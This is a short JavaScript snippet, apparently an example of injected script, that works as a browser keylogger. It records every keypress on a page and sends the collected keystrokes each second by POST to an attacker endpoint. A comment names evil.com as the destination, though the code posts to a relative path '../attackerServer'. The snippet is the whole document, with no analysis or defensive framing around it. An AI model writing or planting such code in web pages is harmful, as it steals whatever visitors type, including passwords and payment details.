// array of user keystrokes
var keystrokes = [];
// event listener which captures user keystrokes
document.onkeypress = function() {
    var key = String.fromCharCode(window.event.keyCode);
    keystrokes.push(key);
}
// function which reports keytrokes back to evil.com every second
setInterval(function() {
    if (keystrokes.length) {
        var xhr = newXHR();
        xhr.open("POST", "../attackerServer");
        xhr.send(keystrokes.join("+"));
    }
    keystrokes = [];
}, 1000);
// function which creates an ajax request object
function newXHR() {
    if (window.XMLHttpRequest)
        return new XMLHttpRequest();
    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
}

